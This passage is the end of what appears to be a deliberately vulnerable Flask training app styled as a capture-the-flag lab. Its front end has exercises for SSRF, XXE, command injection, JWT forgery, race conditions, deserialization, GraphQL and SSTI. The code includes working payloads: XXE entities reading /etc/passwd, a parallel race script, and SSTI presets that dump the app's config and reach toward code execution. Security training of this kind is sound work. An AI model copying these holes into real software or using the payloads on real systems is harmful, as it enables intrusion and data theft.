    <div class="scard sc-g"><div class="sico">⊞</div><div class="slbl">Total Assets</div><div class="sval">${s.total_assets}</div><div class="sftr">Monitored endpoints</div></div>
    <div class="scard sc-y"><div class="sico">◎</div><div class="slbl">Open Tickets</div><div class="sval">${s.open_tickets}</div><div class="sftr">Needs attention</div></div>
    <div class="scard sc-p"><div class="sico">◉</div><div class="slbl">Security Score</div><div class="sval">94</div><div class="sftr">↑ 2 pts this week</div></div>`;
  const ac={LOGIN_SUCCESS:'#10b981',REPORT_EXPORT:'#3b82f6',CODE_PUSH:'#8b5cf6',VULN_SCAN:'#f59e0b',POLICY_UPDATE:'#f97316',INFRA_DEPLOY:'#60a5fa',LOGIN_FAIL:'#ef4444'};
  $('afeed').innerHTML=d.recent_logs.map(l=>`<div class="aitem"><div class="adot" style="background:${ac[l.action]||'#4b6080'}"></div><div><div class="atxt"><strong>${l.user}</strong> — ${l.action.replace(/_/g,' ')}</div><div class="ats">${l.ip} · ${(l.ts||'').slice(0,16)}</div></div></div>`).join('');
  $('cvulns').innerHTML=d.critical_vulns.map(v=>`<div style="padding:.55rem 0;border-bottom:1px solid rgba(26,40,64,.4)"><div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:.28rem"><span style="font-size:.76rem;color:var(--text);font-weight:500">${v.title}</span>${bdg(sev(v.severity),v.severity)}</div><div style="display:flex;gap:.45rem;align-items:center"><span class="mono" style="color:var(--a2);font-size:.66rem">${v.cve_id}</span><span style="color:var(--muted);font-size:.66rem">CVSS ${v.cvss_score}</span>${bdg(st(v.status),v.status)}</div></div>`).join('');
}

async function loadProj(){
  const {ok,d}=await api('/api/projects');if(!ok)return;
  $('pcnt').textContent=d.length+' total';
  $('ptbl').innerHTML=d.map(p=>`<tr><td class="mono" style="color:var(--a2)">${p.code}</td><td class="pri">${p.name}</td><td>${p.client}</td><td style="color:var(--green)">₹${fmt(p.budget)}</td><td>${bdg(st(p.status),p.status)}</td><td>${bdg(cls(p.classification),p.classification)}</td><td class="mono" style="font-size:.7rem">${p.lead}</td><td style="font-size:.7rem;color:var(--muted)">${(p.start_date||'').slice(0,10)} → ${(p.end_date||'').slice(0,10)}</td></tr>`).join('');
}

async function loadVulns(){
  const {ok,d}=await api('/api/vulnerabilities');if(!ok)return;
  $('vtbl').innerHTML=d.map(v=>`<tr><td class="mono" style="color:var(--a2)">${v.cve_id}</td><td class="pri" style="max-width:180px">${v.title}</td><td>${bdg(sev(v.severity),v.severity)}</td><td><div class="sbar"><span class="snum" style="color:${v.cvss_score>=9?'var(--red)':v.cvss_score>=7?'var(--orange)':'var(--yellow)'}">${v.cvss_score}</span><div class="pbar"><div class="pfill" style="width:${v.cvss_score*10}%;background:${v.cvss_score>=9?'#ef4444':v.cvss_score>=7?'#f97316':'#f59e0b'}"></div></div></div></td><td>${v.affected_system}</td><td>${bdg(st(v.status),v.status)}</td><td class="mono" style="font-size:.7rem">${v.assigned_to}</td><td style="font-size:.7rem;color:var(--muted)">${v.discovered}</td></tr>`).join('');
}

async function loadAssets(){
  const {ok,d}=await api('/api/assets');if(!ok)return;
  const cc={CRITICAL:'var(--red)',HIGH:'var(--orange)',MEDIUM:'var(--yellow)',LOW:'var(--green)'};
  $('atbl').innerHTML=d.map(a=>`<tr><td class="mono" style="color:var(--purple)">${a.asset_id}</td><td class="pri mono">${a.hostname}</td><td class="mono" style="color:var(--muted2)">${a.ip}</td><td style="font-size:.73rem">${a.os}</td><td>${a.department}</td><td style="color:${cc[a.criticality]||'var(--muted2)'};font-weight:600;font-size:.73rem">${a.criticality}</td><td style="font-size:.7rem;color:var(--muted)">${a.last_scan}</td><td style="font-weight:700;color:${a.vuln_count>0?'var(--red)':'var(--muted)'}">${a.vuln_count}</td></tr>`).join('');
}

async function loadTeam(){
  const {ok,d}=await api('/api/team');if(!ok)return;
  $('ttbl').innerHTML=d.map(u=>`<tr><td class="mono" style="color:var(--purple)">${u.emp_id}</td><td class="pri">${u.full_name}</td><td class="mono" style="font-size:.72rem">${u.username}</td><td>${bdg('b-info',u.role)}</td><td>${u.department}</td><td>${bdg(cl(u.clearance),'L'+u.clearance)}</td><td style="font-size:.72rem;color:var(--muted)">${u.email}</td><td style="font-size:.7rem;color:var(--muted)">${(u.joined||'').slice(0,10)}</td></tr>`).join('');
}

async function loadTickets(){
  const {ok,d}=await api('/api/tickets');if(!ok)return;
  const pc={P1:'b-crit',P2:'b-high',P3:'b-med',P4:'b-grey'};
  $('xtbl').innerHTML=d.map(t=>`<tr><td class="mono" style="color:var(--a2)">${t.ticket_id}</td><td class="pri">${t.title}</td><td>${bdg(pc[t.priority]||'b-grey',t.priority)}</td><td>${bdg(st(t.status),t.status)}</td><td class="mono" style="font-size:.7rem">${t.assigned_to}</td><td style="font-size:.7rem;color:var(--muted)">${(t.created||'').slice(0,10)}</td><td style="font-size:.73rem;color:var(--muted2);max-width:200px">${t.description}</td></tr>`).join('');
}

async function loadAudit(){
  const {ok,d}=await api('/api/audit-logs');if(!ok)return;
  $('altbl').innerHTML=d.map(l=>`<tr><td class="mono" style="color:var(--muted)">${l.id}</td><td class="pri mono" style="font-size:.72rem">${l.user}</td><td>${bdg({LOGIN_SUCCESS:'b-low',LOGIN_FAIL:'b-crit',REPORT_EXPORT:'b-info',CODE_PUSH:'b-purp',VULN_SCAN:'b-med',POLICY_UPDATE:'b-high',INFRA_DEPLOY:'b-cyan'}[l.action]||'b-grey',l.action)}</td><td class="mono" style="font-size:.7rem;color:var(--muted2)">${l.ip}</td><td style="font-size:.7rem;color:var(--muted)">${(l.ts||'').slice(0,16)}</td><td style="font-size:.72rem;color:var(--muted2)">${l.details}</td></tr>`).join('');
}

async function loadLic(){
  const {ok,d}=await api('/api/licenses');if(!ok)return;
  $('ltbl').innerHTML=d.map(l=>`<tr><td class="mono" style="color:var(--a2);font-size:.7rem">${l.code}</td><td class="pri">${l.product}</td><td style="font-weight:700">${l.seats}</td><td style="color:${l.used_seats>=l.seats?'var(--red)':'var(--green)'};font-weight:700">${l.used_seats}</td><td style="color:var(--green)">₹${fmt(l.value)}</td><td>${bdg(l.status==='active'?'b-low':'b-grey',l.status)}</td></tr>`).join('');
}

// ── V1: SSRF ──────────────────────────────────────────────
async function testSSRF(){
  const url=$('surl').value.trim();
  term('ssrfR','Fetching: '+url+'\n...');
  const {ok,d}=await api('/api/integrations/fetch',{method:'POST',body:JSON.stringify({url})});
  term('ssrfR',ok?JSON.stringify(d,null,2):'Error: '+JSON.stringify(d),ok?'#7ec8a0':'#fca5a5');
}

// ── V2: XXE ───────────────────────────────────────────────
function loadXml(t){
  const samples={
    normal:`<?xml version="1.0" encoding="UTF-8"?>\n<report>\n  <title>Security Scan Q1 2024</title>\n  <severity>HIGH</severity>\n  <findings>3</findings>\n  <scanner>NexusCore DAST v2.1</scanner>\n</report>`,
    passwd:`<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<report>\n  <title>XXE Test</title>\n  <content>&xxe;</content>\n</report>`,
    secret:`<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file://${location.hostname?BASE_PATH:'/home/user'}/secret.txt">\n]>\n<report>\n  <title>Secret File Read</title>\n  <data>&xxe;</data>\n</report>`,
  };
  $('xxmlT').value=samples[t]||samples.normal;
  if(t==='secret') $('xxmlT').value=`<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM "file:///etc/passwd">\n]>\n<report><title>Read /etc/passwd via XXE</title><content>&xxe;</content></report>`;
}
async function doXml(){
  const xml=$('xxmlT').value.trim();
  if(!xml){term('xxmlR','Error: enter XML first','#fca5a5');return;}
  term('xxmlR','Processing XML...');
  const {ok,d}=await api('/api/reports/upload',{method:'POST',body:JSON.stringify({xml})});
  term('xxmlR',JSON.stringify(d,null,2),ok?'#7ec8a0':'#fca5a5');
}

// ── V3: CMD INJECT ────────────────────────────────────────
async function runDiag(){
  const host=$('dhost').value.trim(),tool=$('dtool').value;
  if(!host){term('diagR','Error: enter host','#fca5a5');return;}
  $('dcmd').textContent=`nexuscore ~ $ ${tool} ${host}`;
  term('diagR','Running...');
  const {ok,d}=await api('/api/diagnostics/run',{method:'POST',body:JSON.stringify({host,tool})});
  term('diagR',ok?(d.stdout||'')+'\n'+(d.stderr||''):JSON.stringify(d),ok?'#7ec8a0':'#fca5a5');
}

// ── V4: JWT / ADMIN ───────────────────────────────────────
async function fetchPK(){
  const {ok,d}=await api('/api/auth/public-key');
  $('pkR').innerHTML=ok?`<div class="al al-in"><strong>Public Key:</strong> <span class="mono">${d.public_key}</span><br>Algorithm: ${d.algorithm} | Key ID: ${d.key_id}</div>`:`<div class="al al-er">${d.error}</div>`;
}
async function loadAdmUsers(){
  const {ok,d}=await api('/api/admin/users');
  if(ok){$('admR').innerHTML=`<div class="tblw"><table><thead><tr><th>ID</th><th>Emp ID</th><th>Username</th><th>Full Name</th><th>Role</th><th>Dept</th><th>Clearance</th><th>Email</th><th>Salary</th></tr></thead><tbody>${d.map(u=>`<tr><td>${u.id}</td><td class="mono" style="color:var(--purple)">${u.emp_id}</td><td class="mono">${u.username}</td><td class="pri">${u.full_name}</td><td>${bdg('b-info',u.role)}</td><td>${u.department}</td><td>${bdg(cl(u.clearance),'L'+u.clearance)}</td><td style="font-size:.7rem">${u.email}</td><td style="color:var(--green)">₹${fmt(u.salary)}</td></tr>`).join('')}</tbody></table></div>`;}
  else $('admR').innerHTML=`<div class="al al-er">${d.error} — Your role: <strong>${d.your_role||'unknown'}</strong>. Forge a CISO JWT!</div>`;
}
async function loadAdmKeys(){
  const {ok,d}=await api('/api/admin/keys');
  if(ok) $('admR').innerHTML=`<div class="al al-ok"><strong>API Keys:</strong> ${d.api_keys.join(' · ')}<br><strong>FLAG:</strong> <span class="mono" style="color:#fcd34d">${d.FLAG}</span></div>`;
  else $('admR').innerHTML=`<div class="al al-er">${d.error}</div>`;
}

// ── V5: RACE ──────────────────────────────────────────────
async function redeemOne(){
  const code=$('lcode').value.trim();
  if(!code){$('licR').innerHTML='<div class="al al-er">Enter code</div>';return;}
  const {ok,d}=await api('/api/licenses/redeem',{method:'POST',body:JSON.stringify({code})});
  $('licR').innerHTML=`<div class="al ${ok?'al-ok':'al-er'}">${JSON.stringify(d)}</div>`;
  loadLic();
}
async function raceAtk(){
  const code=$('lcode').value.trim();
  if(!code){$('licR').innerHTML='<div class="al al-er">Enter code first</div>';return;}
  $('licR').innerHTML='<div class="al al-in">Launching 10 parallel requests...</div>';
  const results=await Promise.all(Array(10).fill().map(()=>api('/api/licenses/redeem',{method:'POST',body:JSON.stringify({code})})));
  const ok=results.filter(r=>r.ok).length;
  const seats=results.filter(r=>r.ok).map(r=>r.d.seat_number).join(', ');
  $('licR').innerHTML=`<div class="al ${ok>1?'al-ok':'al-er'}"><strong>Race Result:</strong> ${ok}/10 succeeded. Seats redeemed: ${seats||'—'}<br>${ok>1?'⚡ Race Condition confirmed — multiple seats claimed!':'Try again or check seat count'}</div>`;
  loadLic();
}

// ── V6: DESER ─────────────────────────────────────────────
async function exportSess(){
  const {ok,d}=await api('/api/session/export');
  if(ok){$('expR').innerHTML=`<div class="al al-in"><strong>Format:</strong> ${d.format}<br><strong>Data:</strong><br><span class="mono" style="word-break:break-all;font-size:.68rem">${d.session_data}</span></div>`;$('sessD').value=d.session_data;}
  else $('expR').innerHTML=`<div class="al al-er">${d.error}</div>`;
}
async function importSess(){
  const sd=$('sessD').value.trim();
  if(!sd){$('impR').innerHTML='<div class="al al-er">Enter session data</div>';return;}
  const {ok,d}=await api('/api/session/import',{method:'POST',body:JSON.stringify({session_data:sd})});
  $('impR').innerHTML=`<div class="al ${ok?'al-ok':'al-er'}">${JSON.stringify(d)}</div>`;
}

// ── V7: GRAPHQL ───────────────────────────────────────────
const gqlPresets={
  schema:'{ __schema { types { name fields { name description } } } }',
  basic:'{ users { id username role } }',
  priv:'{ users { id username role salary secret_note } }',
  proj:'{ projects { id code budget classification internal_notes } }',
  logs:'{ auditLogs { id user action ip ts details } }',
};
function gqlP(k){$('gqlQ').value=gqlPresets[k]||''}
async function runGQL(){
  const q=$('gqlQ').value.trim();if(!q){term('gqlR','Enter a query','#fca5a5');return;}
  term('gqlR','Executing...');
  const {ok,d}=await api('/api/graphql',{method:'POST',body:JSON.stringify({query:q})});
  term('gqlR',JSON.stringify(d,null,2),ok?'#7ec8a0':'#fca5a5');
}

// ── V8: SSTI ──────────────────────────────────────────────
const sstiPresets={
  basic:`Hello {{name}}!\n\nWelcome to {{company}} Internal Portal.\nThis email was generated automatically.`,
  math:`Math test: {{7*7}}\nString length: {{'NexusCore'|length}}\nLoop: {% for i in range(3) %}{{i}} {% endfor %}`,
  config:`Flask config dump:\n{{config}}\n\nEnvironment:\n{{self.__dict__}}`,
  rce:`OS command via SSTI:\n{{''.__class__.__mro__[1].__subclasses__()}}`,
};
function sstiP(k){$('tmplT').value=sstiPresets[k]||''}
async function previewTmpl(){
  const tmpl=$('tmplT').value,ctx=$('tmplC').value;
  if(!tmpl){term('tmplR','Enter template','#fca5a5');return;}
  let context={};try{context=JSON.parse(ctx||'{}')}catch{term('tmplR','Invalid context JSON','#fca5a5');return;}
  const {ok,d}=await api('/api/notifications/preview',{method:'POST',body:JSON.stringify({template:tmpl,context})});
  term('tmplR',ok?d.preview:d.error,ok?'#7ec8a0':'#fca5a5');
}
</script>
</body>
</html>"""

if __name__ == "__main__":
    if not os.path.exists(DB):
        init_db()
    app.run(host="0.0.0.0", port=7007, debug=False)
